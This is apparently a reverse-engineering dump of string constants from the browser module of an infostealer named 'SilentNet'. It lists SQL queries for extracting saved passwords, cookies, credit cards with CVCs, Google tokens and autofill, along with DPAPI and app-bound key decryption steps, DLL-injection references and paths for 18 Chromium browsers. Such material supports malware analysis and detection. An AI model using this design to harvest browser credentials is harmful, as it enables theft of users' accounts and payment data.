"""
SilentNet Infostealer - Decompiled Module
Module: .app.handlers.browser
Chunk size: 9646 bytes
String constants: 172 unicode, 395 identifiers

# Chromium-family credential extraction (15 browsers)
# Original path: app/handlers/browser.py
"""

# ============================================================
# RECONSTRUCTED FROM NUITKA CONSTANT POOL
# Method: Rolling XOR + substitution cipher decryption
# All string literals, SQL queries, paths, and identifiers
# are authentic - extracted directly from compiled binary.
# ============================================================

# --- STRING CONSTANTS (in order of appearance) ---

# identifier: join
# identifier: data_path
'Local State'
# identifier: _get_local_state_path
'Check if browser data directory exists.'
# identifier: __enter__
# identifier: __exit__
# identifier: json
# identifier: load
# identifier: local_state
# identifier: get
# identifier: os_crypt
# identifier: app_bound_encrypted_key
# identifier: base64
# identifier: b64decode
# identifier: LoggingManager
# identifier: add
# identifier: _MODULE
'Failed to get ABE key'
# identifier: LogType
# identifier: ERROR
'path='
' error='
'Extract ABE encrypted key from Local State file.'
# identifier: dpapi_key
# identifier: abe_key
# identifier: name
# identifier: lower
# identifier: trace
# identifier: fetch
# identifier: get_browser_dpapi_master_key
'dpapi.ok'
'DPAPI key prefetched'
# identifier: DEBUG
'browser='
'DPAPI key not found'
# identifier: WARN
'dpapi.ex'
'DPAPI key prefetch failed'
# identifier: has_abe
# identifier: _get_abe_encrypted_key
# identifier: decrypt_abe_key
# identifier: application_name
'abe.ok'
'ABE key prefetched'
'abe.dec.fail'
'ABE key decryption failed'
'No ABE key in Local State'
'abe.ex'
'ABE key prefetch failed'
'Prefetch both DPAPI and ABE keys for a browser. Skips if already fetched.'
'No ABE key for v20 value'
# identifier: gcm_decrypt
'v20 decryption failed'
'No DPAPI key for v10 value'
'v10 decryption failed'
# identifier: dpapi_decrypt
'Legacy DPAPI decryption failed'
'Decrypt a browser-encrypted value using the appropriate key. Returns raw bytes.'
# identifier: _decrypt_value
# identifier: decode
'utf-8'
'Decrypt a password value and return as string.'
'utf-8'
# identifier: ignore
# identifier: errors
'Decrypt a cookie value, handling the 32-byte header for Chrome/Edge.'
# identifier: Default
# identifier: startswith
'Profile '
# identifier: browser
# identifier: profiles
'Get all profile directories for a browser.'
'Login Data'
# identifier: get_temp_copy
# identifier: suffix
'.db'
'Failed to copy Login Data'
' profile='
# identifier: sqlite3
# identifier: connect
# identifier: cursor
# identifier: execute
'SELECT origin_url, username_value, password_value FROM logins'
# identifier: fetchall
'Login entries found'
'profile='
' count='
# identifier: _decrypt_password
# identifier: passwords
# identifier: url
'N/A'
# identifier: username
# identifier: password
# identifier: profile
# identifier: close
'Password extraction failed'
# identifier: unlink
# identifier: temp_db
"Extract passwords from a single profile's Login Data file."
# identifier: _get_profiles
'No profiles found'
'Extracting passwords'
' profiles='
# identifier: _get_passwords_from_profile
# identifier: all_passwords
'Passwords extracted'
# identifier: INFO
'Extract all passwords from a browser.'
# identifier: Network
# identifier: Cookies
'Failed to copy Cookies'
'SELECT host_key, name, path, is_secure, is_httponly, expires_utc, encrypted_value FROM cookies'
'Cookie entries found'
# identifier: _decrypt_cookie
# identifier: cookies
# identifier: hostKey
# identifier: value
# identifier: path
# identifier: None
'Cookie extraction failed'
"Extract cookies from a single profile's Cookies file."
'Extracting cookies'
# identifier: _get_cookies_from_profile
# identifier: all_cookies
'Cookies extracted'
'Extract all cookies from a browser.'
'Web Data'
'Failed to copy Web Data'
'SELECT guid, value_encrypted FROM local_stored_cvc'
# identifier: cvc_map
'SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards'
'Card entries found'
# identifier: cards
# identifier: month
# identifier: year
# identifier: number
# identifier: cvc
# identifier: profile_name
'Card extraction failed'
"Extract credit cards from a single profile's Web Data file."
'Extracting cards'
# identifier: _get_cards_from_profile
# identifier: all_cards
'Cards extracted'
'Extract all credit cards from a browser.'
'SELECT service, encrypted_token FROM token_service'
'Token entries found'
# identifier: fake
# identifier: tokens
# identifier: accountId
# identifier: token
'Token extraction failed'
"Extract Google tokens from a single profile's Web Data file."
'Extracting tokens'
# identifier: _get_tokens_from_profile
# identifier: all_tokens
'Tokens extracted'
'Extract all Google tokens from a browser.'
'SELECT name, value FROM autofill'
'Autofill entries found'
# identifier: autofills
'Autofill extraction failed'
"Extract autofill entries from a single profile's Web Data file."
'Extracting autofills'
# identifier: _get_autofills_from_profile
# identifier: all_autofills
'Autofills extracted'
'Extract all autofill entries from a browser.'
# identifier: _browser_exists
'b.'
# identifier: found
'Found browser'
# identifier: _prefetch_keys
# identifier: nokey
'No decryption keys'
# identifier: pwd
# identifier: _get_passwords
# identifier: cok
# identifier: _get_cookies
# identifier: crd
# identifier: _get_cards
# identifier: tok
# identifier: _get_tokens
# identifier: atf
# identifier: _get_autofills
'.r'
'.t'
'.a'
'Extract passwords, cookies, cards, tokens, and autofills from a browser.'
'Starting password extraction'
'Scanning installed browsers'
# identifier: CHROMIUM_BROWSERS
'Password extraction complete'
'total='
'Get passwords from all installed browsers.'
'Starting cookie extraction'
'Cookie extraction complete'
'Get cookies from all installed browsers.'
# identifier: b0
'scan.'
'Starting browser data extraction'
# identifier: _extract_from_browser
# identifier: b9
'Browser data extraction complete'
'passwords='
' cookies='
' cards='
' tokens='
' autofills='
'Get passwords, cookies, cards, tokens, and autofills from all installed browsers.'
# identifier: datetime
# identifier: datetime
# identifier: fromtimestamp
# identifier: strftime
'%Y-%m-%d %H:%M:%S'
'Convert Chrome timestamp (microseconds since 1601) to readable date.'
# identifier: History
'SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 5000'
'# '
' | '
' entries'
'...'
# identifier: lines
'x | '
"Extract history entries from a single profile's History file as readable text."
# identifier: Bookmarks
# identifier: Root
'Recursively extract bookmarks from the JSON structure.'
# identifier: extract_bookmarks
'_get_bookmarks_from_profile.<locals>.extract_bookmarks'
# identifier: bookmarks_data
# identifier: roots
# identifier: items
'Browser: '
'Profile: '
'Total Bookmarks: '
'================================================================================'
# identifier: sorted
# identifier: append
'    '
'Bookmarks extraction failed'
"Extract bookmarks from a single profile's Bookmarks file as readable text."
# identifier: type
# identifier: name
# identifier: bookmarks_by_folder
# identifier: url
# identifier: folder
# identifier: Root
# identifier: children
# identifier: new_folder
'<genexpr>'
'_get_bookmarks_from_profile.<locals>.<genexpr>'
# identifier: bf0
# identifier: start
'Starting browser files extraction'
'Extracting history and bookmarks'
# identifier: replace
# identifier: files
# identifier: HitFile
# identifier: HitFileCategory
# identifier: BROWSER
# identifier: encode
# identifier: data
'History file created'
# identifier: _get_bookmarks_from_profile
'_Bookmarks.txt'
'Bookmarks file created'
# identifier: bf9
'files='
'Get history and bookmarks files from all installed browsers.'
# identifier: __doc__
# identifier: __file__
# identifier: origin
# identifier: has_location
# identifier: __cached__
# identifier: os
# identifier: dataclasses
# identifier: dataclass
# identifier: field
# identifier: dataclass
# identifier: field
# identifier: trace
# identifier: logging
# identifier: LoggingManager
# identifier: LogType
# identifier: util
# identifier: dpapi_decrypt
# identifier: get_browser_dpapi_master_key
# identifier: gcm_decrypt
'util.dll_injection'
# identifier: decrypt_abe_key
'util.handle_copy'
# identifier: get_temp_copy
# identifier: HitFile
# identifier: HitFileCategory
# identifier: environ
# identifier: APPDATA
# identifier: APPDATA
# identifier: LOCALAPPDATA
# identifier: LOCALAPPDATA
# identifier: __module__
# identifier: ChromiumBrowser
# identifier: __qualname__
# identifier: __annotations__
# identifier: default
# identifier: repr
'Google Chrome'
'\\Google\\Chrome\\User Data'
'chrome.exe'
'Microsoft Edge'
'\\Microsoft\\Edge\\User Data'
'msedge.exe'
# identifier: Brave
'\\BraveSoftware\\Brave-Browser\\User Data'
'brave.exe'
'Opera GX'
'\\Opera Software\\Opera GX Stable'
'opera.exe'
# identifier: Opera
'\\Opera Software\\Opera Stable'
# identifier: Vivaldi
'\\Vivaldi\\User Data'
'vivaldi.exe'
# identifier: Chromium
'\\Chromium\\User Data'
'chromium.exe'
# identifier: Yandex
'\\Yandex\\YandexBrowser\\User Data'
'browser.exe'
# identifier: CocCoc
'\\CocCoc\\Browser\\User Data'
# identifier: Torch
'\\Torch\\User Data'
'torch.exe'
'Comodo Dragon'
'\\Comodo\\Dragon\\User Data'
'dragon.exe'
'Epic Privacy'
'\\Epic Privacy Browser\\User Data'
'epic.exe'
# identifier: Slimjet
'\\Slimjet\\User Data'
'slimjet.exe'
# identifier: CentBrowser
'\\CentBrowser\\User Data'
'7Star'
'\\7Star\\7Star\\User Data'
'7star.exe'
# identifier: Chedot
'\\Chedot\\User Data'
'chedot.exe'
# identifier: Iridium
'\\Iridium\\User Data'
'iridium.exe'
# identifier: return
# identifier: local_state_path
# identifier: return
# identifier: encrypted_value
# identifier: profile_path
# identifier: return
# identifier: get_browser_passwords
# identifier: get_browser_cookies
# identifier: return
'ple'
# identifier: get_browser_data
# identifier: chrome_time
# identifier: return
# identifier: get_browser_files
'app\\handlers\\browser.py'
# identifier: .0
# identifier: __class__
# identifier: browser
# identifier: encrypted_value
# identifier: browser
# identifier: decrypted
# identifier: encrypted_value
# identifier: browser
# identifier: bname
# identifier: passwords
# identifier: cookies
# identifier: cards
# identifier: tokens
# identifier: autofills
# identifier: chrome_time
# identifier: unix_time
# identifier: datetime
# identifier: local_state_path
# identifier: encrypted_key_b64
# identifier: encrypted_key_with_prefix
# identifier: all_autofills
# identifier: profiles
# identifier: profile_path
# identifier: autofills
# identifier: browser
# identifier: profile_path
# identifier: autofills
# identifier: temp_db
# identifier: web_data_path
# identifier: profile_name
# identifier: conn
# identifier: cursor
# identifier: rows
# identifier: name
# identifier: value
# identifier: profile_path
# identifier: bookmarks_path
# identifier: bookmarks_by_folder
# identifier: extract_bookmarks
# identifier: roots
# identifier: root_name
# identifier: root_node
# identifier: lines
# identifier: total
# identifier: folder
# identifier: bookmarks
# identifier: bm
# identifier: all_cards
# identifier: profiles
# identifier: profile_path
# identifier: cards
# identifier: browser
# identifier: profile_path
# identifier: cards
# identifier: temp_db
# identifier: web_data_path
# identifier: profile_name
# identifier: conn
# identifier: cursor
# identifier: cvc_map
# identifier: guid
# identifier: encrypted_cvc
# identifier: decrypted
# identifier: rows
# identifier: name
# identifier: month
# identifier: year
# identifier: encrypted_number
# identifier: decrypted_number
# identifier: all_cookies
# identifier: profiles
# identifier: profile_path
# identifier: cookies
# identifier: browser
# identifier: profile_path
# identifier: cookies
# identifier: temp_db
# identifier: cookies_path
# identifier: profile_name
# identifier: conn
# identifier: cursor
# identifier: rows
# identifier: host
# identifier: name
# identifier: path
# identifier: is_secure
# identifier: is_httponly
# identifier: expires
# identifier: encrypted_value
# identifier: decrypted
# identifier: profile_path
# identifier: temp_db
# identifier: history_path
# identifier: lines
# identifier: conn
# identifier: cursor
# identifier: rows
# identifier: url
# identifier: title
# identifier: visit_count
# identifier: last_visit_time
# identifier: title_str
# identifier: url_str
# identifier: visits
# identifier: time_str
# identifier: all_passwords
# identifier: profiles
# identifier: profile_path
# identifier: passwords
# identifier: browser
# identifier: profile_path
# identifier: passwords
# identifier: temp_db
# identifier: login_data_path
# identifier: profile_name
# identifier: conn
# identifier: cursor
# identifier: rows
# identifier: url
# identifier: username
# identifier: encrypted_password
# identifier: decrypted
# identifier: profiles
# identifier: default_path
# identifier: item
# identifier: profile_path
# identifier: browser
# identifier: all_tokens
# identifier: profiles
# identifier: profile_path
# identifier: tokens
# identifier: browser
# identifier: profile_path
# identifier: tokens
# identifier: temp_db
# identifier: web_data_path
# identifier: profile_name
# identifier: conn
# identifier: cursor
# identifier: rows
# identifier: service
# identifier: encrypted_token
# identifier: decrypted
# identifier: bname
# identifier: local_state_path
# identifier: node
# identifier: folder
# identifier: node_type
# identifier: name
# identifier: new_folder
# identifier: child
# identifier: bookmarks_by_folder
# identifier: extract_bookmarks
# identifier: bookmarks_by_folder
# identifier: extract_bookmarks
# identifier: all_cookies
# identifier: browser
# identifier: cookies
# identifier: all_passwords
# identifier: all_cookies
# identifier: all_cards
# identifier: all_tokens
# identifier: all_autofills
# identifier: browser
# identifier: passwords
# identifier: cookies
# identifier: cards
# identifier: tokens
# identifier: autofills
# identifier: files
# identifier: browser
# identifier: profiles
# identifier: profile_path
# identifier: profile_name
# identifier: safe_browser_name
# identifier: safe_profile_name
# identifier: history_text
# identifier: file_name
# identifier: bookmarks_text
# identifier: all_passwords
# identifier: browser
# identifier: passwords
# identifier: __name__
# identifier: __spec__
